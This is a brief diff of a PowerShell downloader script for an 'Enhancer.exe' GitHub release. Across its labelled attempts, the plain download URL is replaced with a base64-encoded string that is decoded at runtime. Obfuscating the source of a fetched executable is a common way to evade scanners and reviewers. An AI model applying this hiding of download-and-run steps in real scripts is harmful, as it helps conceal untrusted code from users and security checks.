@@ -1,6 +1,13 @@
-# Try 2
-# Define the URL of the executable to download
-$url = "https://github.com/jewelshkjony/Enhancer/releases/download/1.0.0/Enhancer.exe"
+# Try 3
+# Base64 encoded URL
+$baseUrl = "aHR0cHM6Ly9naXRodWIuY29tL2pld2Vsc2hram9ueS9FbmhhbmNlci9yZWxlYXNlcy9kb3dubG9hZC8xLjAuMC9FbmhhbmNlci5leGU="
+
+# Decode the base64 string
+$decodedBytes = [System.Convert]::FromBase64String($baseUrl)
+$url = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
+
+# Output the decoded URL
+Write-Output $url
 
 # Define the destination path dynamically using the current user's profile path
 $destination = "$env:LOCALAPPDATA\Enhancer\Enhancer.exe"
